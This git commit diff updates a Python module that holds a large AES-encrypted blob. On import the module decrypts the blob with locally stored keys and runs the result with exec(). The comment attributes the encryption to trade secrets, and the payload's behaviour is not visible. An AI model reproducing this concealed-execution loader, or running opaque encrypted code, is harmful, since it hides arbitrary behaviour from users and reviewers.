ce5eda48d2b13ab8ecc07a4b638968441d37c73d
Yicong Qian <88839367+Airthrix@users.noreply.github.com>
2025-06-21 07:16:59 +0800

    Update modular_aliceskygarden_t3.py

--- modular_aliceskygarden_t3.py
+++ modular_aliceskygarden_t3.py
@@ -1,14 +1,12 @@
 # Encrypted. As it involves trade secrets, it is not fully open source at present.  API
 # 数据已加密
-ENCRYPTED_DATA = r"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"
-# 数据已加密
+ENCRYPTED_DATA = r"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"
+
 import os
 import base64
 import zlib
-import marshal
 import types
 import sys
-import hashlib
 import json
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
@@ -30,7 +28,7 @@ def get_data_key():
     master_key = get_master_key()    
     try:
         with open(CONFIG_FILE, "rb") as f:
-            encrypted_config = f.read()        
+            encrypted_config = f.read()       
         decrypted_config = decrypt_data(encrypted_config, master_key)
         config = json.loads(decrypted_config)
         return base64.b64decode(config["key"])
@@ -39,29 +37,27 @@ def get_data_key():
 
 def _secure_load():
     try:
-        key = get_data_key()
+        key = get_data_key()        
         encrypted_bytes = base64.b64decode(ENCRYPTED_DATA)        
-        decrypted = decrypt_data(encrypted_bytes, key)
-        decompressed = zlib.decompress(decrypted)
-        bytecode = marshal.loads(decompressed)
+        decrypted = decrypt_data(encrypted_bytes, key)        
+        source_code = zlib.decompress(decrypted).decode("utf-8")        
         module = types.ModuleType("modular_aliceskygarden_t3")
         module.__file__ = __file__
         module.__name__ = "modular_aliceskygarden_t3"
-        module.__package__ = ""
-        exec(bytecode, module.__dict__)
+        module.__package__ = ""        
+        exec(source_code, module.__dict__)
         return module
     except Exception as e:
         raise ImportError(f"ERROR: {str(e)}") from e
 
 try:
-    _module = _secure_load()
+    _module = _secure_load()    
     for _name in dir(_module):
         if not _name.startswith('__'):
-            globals()[_name] = getattr(_module, _name)
-    
+            globals()[_name] = getattr(_module, _name)   
     sys.modules["modular_aliceskygarden_t3"] = _module
     
 except ImportError as e:
     print(f"\033[91mERROR: {e}\033[0m")
-    print(f"please make sure file {MASTER_KEY_FILE} and {CONFIG_FILE} exist")
+    print(f"please make sure {MASTER_KEY_FILE} 和 {CONFIG_FILE} exist")
     sys.exit(1)
